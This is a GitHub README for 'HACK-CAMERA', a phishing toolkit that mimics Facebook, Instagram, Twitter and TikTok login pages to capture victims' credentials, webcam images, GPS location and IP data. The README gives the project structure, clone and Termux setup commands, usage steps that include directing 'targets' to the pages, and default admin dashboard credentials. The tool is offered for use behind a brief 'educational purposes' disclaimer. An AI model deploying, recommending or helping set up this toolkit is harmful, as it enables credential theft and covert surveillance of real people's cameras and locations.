# 📸 HACK-CAMERA Project


<p align="center">
  <a href="https://github.com/MD-HACKER07/HACK-CAMERA/stargazers"><img src="https://img.shields.io/github/stars/MD-HACKER07/HACK-CAMERA?style=for-the-badge&color=yellow"></a>
  <a href="https://github.com/MD-HACKER07/HACK-CAMERA/network/members"><img src="https://img.shields.io/github/forks/MD-HACKER07/HACK-CAMERA?style=for-the-badge&color=blue"></a>
  <a href="https://github.com/MD-HACKER07/HACK-CAMERA/issues"><img src="https://img.shields.io/github/issues/MD-HACKER07/HACK-CAMERA?style=for-the-badge&color=red"></a>
  <a href="#"><img src="https://img.shields.io/badge/MAINTAINED-YES-green?style=for-the-badge"></a>
</p>

<p align="center">
  📱 A powerful social media phishing toolkit with advanced webcam capture and location tracking capabilities
</p>

## 🚀 Features

- **🔄 Multiple Platform Support**: Facebook, Instagram, Twitter, and TikTok
- **🎨 Dynamic Theming**: Pages automatically style themselves based on the selected platform
- **📊 Comprehensive Data Collection**:
  - 📸 Webcam capture
  - 🌎 Precise GPS location tracking
  - 🔑 Login credentials
  - 🌐 IP address and browser information
- **💻 Modern UI**: Responsive design with animations and modern styling
- **📱 QR Code Login Option**: Alternative login method that also captures data
- **📊 Admin Dashboard**: Visualize and manage all collected data

## 📋 Project Structure

```
HACK-CAMERA/
├── images/                  # Platform logos and UI elements
├── social/                  # Main phishing pages
│   ├── SocialLogin.html     # Original login page
│   ├── EnhancedLogin.html   # Improved login page with more features
│   └── forwarding_link/     # Backend scripts for data collection
│       ├── ip.php           # Collects IP and location data
│       ├── post.php         # Processes webcam images
│       └── credentials.php  # Stores login credentials
├── admin/                   # Admin dashboard for viewing collected data
│   └── dashboard.php        # Secure dashboard interface
├── captured_images/         # Storage for webcam captures
└── index.html               # Platform selection page
```

## 🔧 Installation

1. **Clone the repository**:
```bash
git clone https://github.com/MD-HACKER07/HACK-CAMERA.git
```

2. **Navigate to the project directory**:
```bash
cd HACK-CAMERA
```

3. **Set up a PHP server**:
```bash
# For PHP's built-in server:
php -S localhost:8000

# Or use XAMPP, WAMP, or any other PHP server
```

## 📱 Supported Platforms

<table>
  <tr>
    <td align="center"><img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" width="100px;" alt="Facebook"/><br /><b>Facebook</b></td>
    <td align="center"><img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" width="100px;" alt="Instagram"/><br /><b>Instagram</b></td>
    <td align="center"><img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" width="100px;" alt="Twitter"/><br /><b>Twitter</b></td>
    <td align="center"><img src="https://cdn-icons-png.flaticon.com/512/3938/3938055.png" width="100px;" alt="TikTok"/><br /><b>TikTok</b></td>
  </tr>
</table>

## 🖥️ Usage

1. Host the files on a web server with PHP support
2. Configure the `forwarding_link` in the HTML files if needed
3. Direct targets to the main `index.html` file
4. All collected data will be stored in text files in the server directory
5. Access the admin dashboard at `/admin/dashboard.php` (default credentials: admin/hackadmin123)

## 🌟 Enhanced Features

The enhanced version includes:
- 🖼️ Platform logo display
- ⏳ Animated loading overlay
- ✅ Form validation
- 📱 QR code login option
- 🔑 Remember me checkbox
- 📊 Detailed admin dashboard
- 📱 Mobile-responsive design

## 💻 Running on Termux

```bash
apt update && apt upgrade -y
apt install git php curl wget -y
git clone https://github.com/MD-HACKER07/HACK-CAMERA.git
cd HACK-CAMERA
termux-setup-storage
bash setup
bash hack_camera.sh
```

## 📋 Requirements

- PHP 7.0 or higher
- Web server (Apache, Nginx, or PHP's built-in server)
- Modern web browser

## ⚠️ Disclaimer

**This tool is developed for educational purposes only.** It demonstrates how camera phishing works and the potential privacy implications of granting camera/location permissions to websites. If anybody wants to gain unauthorized access to someone's camera, they do so at their own risk. You are responsible for your actions and liable for any damage or violation of laws by using this tool. The author is not responsible for any misuse of HACK-CAMERA!

## 👨‍💻 Connect with the Developer

<p align="center">
  <a href="https://github.com/MD-HACKER07"><img src="https://img.shields.io/badge/GitHub-100000?style=for-the-badge&logo=github&logoColor=white"></a>
  <a href="https://www.instagram.com/iammd_18_"><img src="https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&logo=instagram&logoColor=white"></a>
  <a href="https://in.linkedin.com/in/md-abu-shalem-alam-726a93292"><img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white"></a>
  <a href="https://abushalem.site/"><img src="https://img.shields.io/badge/Website-FF5722?style=for-the-badge&logo=blogger&logoColor=white"></a>
</p>

<p align="center">
  <i>Thank you for using HACK-CAMERA! Please star ⭐ the repository if you find it useful!</i>
</p>
